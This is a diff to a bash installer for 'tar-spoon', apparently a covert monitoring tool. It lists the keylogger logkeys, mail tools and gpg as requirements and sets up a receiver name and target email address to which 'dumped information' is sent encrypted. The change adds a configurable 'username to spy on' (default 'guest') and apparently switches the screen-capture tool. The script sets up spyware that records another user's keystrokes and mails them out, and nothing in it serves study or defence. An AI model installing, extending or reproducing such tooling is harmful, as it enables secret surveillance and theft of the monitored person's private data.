@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # todo: archlinux PKGBUILD for tar-spoon
-echo "Please make sure these are installed: sudo, systemd, ssmtp, logkeys, scrot, wicd, gpg"
+echo "Please make sure these are installed: sudo, systemd, ssmtp, mutt, imagemagick, logkeys, wicd, gpg"
 echo "Logkeys can be found here: http://code.google.com/p/logkeys/source/checkout"
 echo -n "Press enter to continue..."
 read
@@ -36,7 +36,11 @@ done
 sudo mkdir -p /usr/local/etc/tarspoon
 sudo touch /usr/local/etc/tarspoon/receiver.name
 sudo touch /usr/local/etc/tarspoon/receiver.mail
+echo -n "guest" > /tmp/user.local
+sudo mv /tmp/user.local /usr/local/etc/tarspoon/
 echo "Heads up! You will need to generate keypair that the program will use to transport dumped information over mail."
 echo "  Import the pubkey with the ultimate trust to the local root keyring;"
 echo "  Put name assigned to that keyring into /usr/local/etc/tarspoon/receiver.name;"
 echo "  Target email address into /usr/local/etc/tarspoon/receiver.mail."
+echo "  Also, you will need to configure username to spy on (default is guest)"
+echo "  Put it into /usr/local/etc/tarspoon/user.local"
